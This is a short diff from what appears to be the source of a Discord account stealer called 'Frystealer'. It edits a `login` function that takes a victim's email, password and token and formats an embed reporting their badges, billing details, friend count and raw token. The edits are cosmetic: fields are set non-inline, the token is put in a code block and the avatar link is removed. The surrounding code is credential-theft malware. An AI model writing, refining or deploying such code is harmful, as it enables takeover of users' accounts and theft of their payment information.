@@ -626,12 +626,12 @@ const login = async (email, password, token) => {
           {  
             name: 'Badges',
             value: `${badges}`,
-            inline: true,
+            inline: false,
           },
           {
             name: 'Billing',
             value: `**${billing}**`,
-            inline: true,
+            inline: false,
           },
           {
             name: 'Friends Total',
@@ -650,13 +650,13 @@ const login = async (email, password, token) => {
           },
           {
             name: 'Token',
-            value: `\`${token}\``,
-            inline: true,
+            value: `\`\`\`${token}\`\`\``,
+            inline: false,
           },
         ],
         author: {
           name: 'User Login',
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          icon_url: ``,
         },
         footer: {
           text: 'Frystealer',
